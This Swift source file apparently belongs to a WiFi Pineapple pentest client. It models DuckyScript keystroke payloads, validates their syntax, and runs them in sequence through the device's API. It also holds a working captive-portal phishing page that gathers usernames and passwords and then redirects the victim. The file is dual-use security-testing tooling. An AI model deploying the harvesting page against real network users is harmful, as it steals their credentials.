import Foundation

// MARK: - DuckyScript

/// A DuckyScript payload for execution via the Pineapple.
public struct DuckyPayload: Codable, Sendable {
    public let name: String
    public let description: String
    public let script: String
    public let targetOS: TargetOS

    public enum TargetOS: String, Codable, Sendable {
        case windows, macos, linux, any
    }

    public init(name: String, description: String, script: String, targetOS: TargetOS = .any) {
        self.name = name
        self.description = description
        self.script = script
        self.targetOS = targetOS
    }

    // MARK: - Validation

    /// Returns `true` if the script parses without syntax errors.
    public var isValid: Bool {
        let validCommands = Set([
            "REM", "DELAY", "STRING", "ENTER", "GUI", "ALT", "CTRL", "SHIFT",
            "UP", "DOWN", "LEFT", "RIGHT", "TAB", "ESCAPE", "BACKSPACE", "DELETE",
            "SPACE", "CAPSLOCK", "NUMLOCK", "SCROLLLOCK", "F1", "F2", "F3", "F4",
            "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12", "PRINTSCREEN",
            "PAUSE", "BREAK", "INSERT", "HOME", "END", "PAGEUP", "PAGEDOWN"
        ])
        return script.components(separatedBy: "\n")
            .map { $0.trimmingCharacters(in: .whitespaces) }
            .filter { !$0.isEmpty }
            .allSatisfy { line in
                let keyword = line.components(separatedBy: " ").first?.uppercased() ?? ""
                return validCommands.contains(keyword)
            }
    }
}

// MARK: - Captive portal

/// A captive portal HTML template for credential harvesting (testing/research only).
public struct CaptivePortal: Codable, Sendable {
    public let title: String
    public let logoURL: String?
    public let redirectURL: String
    public let htmlTemplate: String

    public init(
        title: String = "Network Login",
        logoURL: String? = nil,
        redirectURL: String = "https://google.com"
    ) {
        self.title = title
        self.logoURL = logoURL
        self.redirectURL = redirectURL
        self.htmlTemplate = CaptivePortal.generateHTML(title: title, redirectURL: redirectURL)
    }

    private static func generateHTML(title: String, redirectURL: String) -> String {
        """
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>\(title)</title>
            <style>
                body { font-family: -apple-system, sans-serif; display: flex;
                       justify-content: center; align-items: center; min-height: 100vh;
                       background: #f0f0f0; margin: 0; }
                .card { background: #fff; padding: 2rem; border-radius: 12px;
                        box-shadow: 0 4px 16px rgba(0,0,0,.1); min-width: 320px; }
                input { width: 100%; padding: .75rem; margin: .5rem 0; border: 1px solid #ccc;
                        border-radius: 6px; box-sizing: border-box; }
                button { width: 100%; padding: .75rem; background: #007AFF; color: #fff;
                         border: none; border-radius: 6px; font-size: 1rem; cursor: pointer; }
            </style>
        </head>
        <body>
          <div class="card">
            <h2>\(title)</h2>
            <form method="POST" action="/login">
              <input type="text"     name="username" placeholder="Username" required>
              <input type="password" name="password" placeholder="Password" required>
              <button type="submit">Connect</button>
            </form>
          </div>
          <script>
            document.querySelector('form').addEventListener('submit', function(e) {
              e.preventDefault();
              fetch('/login', { method: 'POST', body: new FormData(this) })
                .then(() => window.location.href = '\(redirectURL)');
            });
          </script>
        </body>
        </html>
        """
    }
}

// MARK: - Automation script

/// A higher-level automation script composed of `DuckyPayload` sequences.
public struct AutomationScript: Sendable {
    public let payloads: [DuckyPayload]
    public let delayBetweenPayloadSeconds: TimeInterval

    public init(payloads: [DuckyPayload], delay: TimeInterval = 1.0) {
        self.payloads = payloads
        self.delayBetweenPayloadSeconds = delay
    }

    /// Combines all payload scripts into a single DuckyScript string, separated by DELAY commands.
    public var combined: String {
        payloads.map(\.script)
            .joined(separator: "\nDELAY \(Int(delayBetweenPayloadSeconds * 1000))\n")
    }

    /// Executes each payload sequentially via the provided API client.
    /// Respects task cancellation between payloads.
    public func execute(using client: PineappleAPIClient) async throws {
        for payload in payloads {
            try Task.checkCancellation()
            try await client.executePayload(script: payload.script)
            if delayBetweenPayloadSeconds > 0 {
                do {
                    try await Task.sleep(for: .seconds(delayBetweenPayloadSeconds))
                } catch is CancellationError {
                    throw CancellationError()
                }
            }
        }
    }
}
